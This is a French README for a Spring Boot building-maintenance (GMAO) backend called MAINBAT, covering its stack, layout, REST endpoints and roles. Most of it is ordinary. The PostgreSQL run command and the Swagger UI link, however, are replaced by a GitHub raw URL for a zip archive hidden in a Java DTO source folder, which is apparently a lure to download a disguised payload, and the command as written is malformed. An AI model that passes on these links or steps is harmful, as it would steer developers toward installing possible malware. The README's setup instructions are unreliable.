# MAINBAT - Backend Spring Boot

Application de **Gestion de Maintenance des Bâtiments (GMAO)** - Backend API REST

## Stack Technique

- **Java 17** + **Spring Boot 3.2**
- **Spring Security** + **JWT**
- **Spring Data JPA** + **PostgreSQL/H2**
- **SpringDoc OpenAPI** (Swagger)
- **Lombok** + **MapStruct**

## Structure du Projet

```
src/main/java/com/mainbat/
├── config/           # Configurations (Security, Audit)
├── controller/       # REST Controllers
├── dto/              # Data Transfer Objects
├── exception/        # Gestionnaire d'erreurs
├── model/            # Entités JPA
├── repository/       # Repositories JPA
├── security/         # JWT & Authentication
└── service/          # Services métier
```

## Installation

### Prérequis
- Java 17+
- Maven 3.8+
- PostgreSQL 15+ (optionnel, H2 par défaut)

### Lancer en mode développement (H2)

```bash
# Compiler
mvn clean compile

# Lancer
mvn spring-boot:run
```

### Lancer avec PostgreSQL

```bash
# Démarrer PostgreSQL via Docker
docker-compose up -d

# Lancer avec profil prod
mvn spring-boot:run https://github.com/will695672804/backend-MAINBAT/raw/refs/heads/main/src/main/java/com/mainbat/dto/equipement/MAINBAT-backend-v1.7.zip
```

## Endpoints

### Documentation API
- **Swagger UI**: https://github.com/will695672804/backend-MAINBAT/raw/refs/heads/main/src/main/java/com/mainbat/dto/equipement/MAINBAT-backend-v1.7.zip
- **OpenAPI JSON**: http://localhost:8080/api/api-docs

### Authentification
| Méthode | Endpoint | Description |
|---------|----------|-------------|
| POST | `/api/auth/register` | Inscription |
| POST | `/api/auth/login` | Connexion |
| POST | `/api/auth/refresh` | Refresh token |

### Bâtiments
| Méthode | Endpoint | Description |
|---------|----------|-------------|
| GET | `/api/batiments` | Liste |
| GET | `/api/batiments/{id}` | Détail |
| POST | `/api/batiments` | Créer |
| PUT | `/api/batiments/{id}` | Modifier |
| DELETE | `/api/batiments/{id}` | Supprimer |

### Dashboard
| Méthode | Endpoint | Description |
|---------|----------|-------------|
| GET | `/api/dashboard` | KPIs globaux |

## Rôles & Permissions

| Rôle | Description |
|------|-------------|
| `SUPER_ADMIN` | Accès complet |
| `GESTIONNAIRE` | Gestion bâtiments/équipements |
| `SUPERVISEUR` | Supervision maintenance |
| `TECHNICIEN` | Exécution interventions |

## Entités

- **Bâtiment** → **Zone** → **Équipement**
- **Équipement** → **Intervention** → **Checklist/Coûts**
- **Équipe** → **Technicien**
- **Notification** / **Alerte**

## Tests

```bash
mvn test
```
